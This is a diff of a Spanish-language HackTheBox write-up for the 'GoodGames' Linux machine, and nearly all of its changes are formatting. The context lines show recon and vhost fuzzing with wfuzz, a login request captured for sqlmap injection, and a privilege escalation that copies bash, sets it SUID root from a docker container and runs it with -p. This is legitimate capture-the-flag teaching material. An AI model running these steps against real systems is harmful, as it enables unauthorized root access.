@@ -11,15 +11,11 @@ description : 🎮🕹️En esta máquina Linux de nivel easy tocaremos un poco 
 
 🎮🕹️En esta máquina Linux de nivel easy tocaremos un poco de sql, a través de sqlmap, explotaremos una vulnerabilidad ssti y escalaremos privielgios a través del binario bash jugando con los poermisos del mismo desde docker y una shell ssh🕹️🎮.
 
-🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)
-
 ![](/assets/images/HTB/Goodgames-HackTheBox/goodgames2.webp)
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/estadisticas.webp)
 
 ***
-
-
 **Un pequeño INDICE**
 
 1. [Reconocimiento](#reconocimiento).
@@ -28,8 +24,6 @@ description : 🎮🕹️En esta máquina Linux de nivel easy tocaremos un poco 
 4. [SSTI](#ssti).
 5. [Contenedor docker](#docker).
 6. [Escalada de Privilegios](#privesc).
-
-
 ***
 
 # Reconocimiento [#](reconocimiento) {#reconocimiento}
@@ -46,7 +40,7 @@ Esta heramienta creada por s4vitar se basa en el ttl (time to live) para identif
 ```bash
 ❯ whichSystem.py 10.10.11.130
 
-	10.10.11.130 (ttl -> 63): Linux
+10.10.11.130 (ttl -> 63): Linux
 ```
 
 Ahora ya se que me enfrento a una máquina linux, ya que su ttl es 63, aunque generalmente debería ser 64.
@@ -65,8 +59,7 @@ Service Info: Host: goodgames.htb
 
 > Dominio goodgames.htb 
 
-> Servidor Apache 2.4.51
-
+* Servidor Apache 2.4.51
 
 # Enumeración Web [🔢](#enum-web) {#enum-web}
 
@@ -76,7 +69,6 @@ Antes de acceder a ojear el servidor web desde el navegador, lanzo la herramient
 ❯ whatweb 10.10.11.130
 http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
 ```
-
 Ahora accedo desde el navegador al servidor web.
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/web1.webp)
@@ -101,12 +93,11 @@ ID           Response   Lines    Word       Chars       Payload
 000044933:   200        286 L    620 W      10524 Ch    "coming-soon" 
 ```
 
-Y encuentro varias rutas de interés como /signup y /forgot-password.
+Y encuentro varias rutas de interés como `/signup` y `/forgot-password`.
 
-Accedo a la ruta /signup donde encuentro un formulario de registro y otro de login.
+Accedo a la ruta `/signup` donde encuentro un formulario de registro y otro de login.
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/login-web.webp)
-
 
 # Inyección SQL [#](inyección) {#sql}
 
@@ -130,7 +121,7 @@ A través de wfuzz ejecuto el escaneo con el comando:
 
 ```bash
 # Escaneo vhost a través de wfuzz
----------------------------------
+
 wfuzz -H "Host: FUZZ.goodgames.htb" --hl 1734 --hc 404,403 -c -z file,"/usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt" http://10.10.11.130
 ```
 Pero no encuentro nada... por lo que sigo buscando por la web algo que me de una pista o un hilo para continuar...
@@ -139,7 +130,7 @@ Asique tras un tiempo buscando encontré lo siguiente en el código fuente:
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/vhost.webp)
 
-> VHOST --> internal-administration.goodgames.htb
+> VHOST --> `internal-administration.goodgames.htb`
 
 Lo añado al vhost y accedo desde el navegador.
 
@@ -151,7 +142,7 @@ Por lo que decido usar la herramienta sqlmap y para ello sigo estos pasos:
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/burp.webp)
 
-```burp
+```bash
 POST /login HTTP/1.1
 Host: goodgames.htb
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
@@ -350,12 +341,10 @@ augustus@GoodGames:~$ cp /bin/bash .
 augustus@GoodGames:~$ ls
 bash  user.txt
 
------------------------------------
 
 root@3a453ab39d3d:/home/augustus chown root:root /home/augustus/bash  
 root@3a453ab39d3d:/home/augustus chmod +s /home/augustus/bash
 
------------------------------------
 
 augustus@GoodGames:~$ ./bash -p
 bash-5.1# id
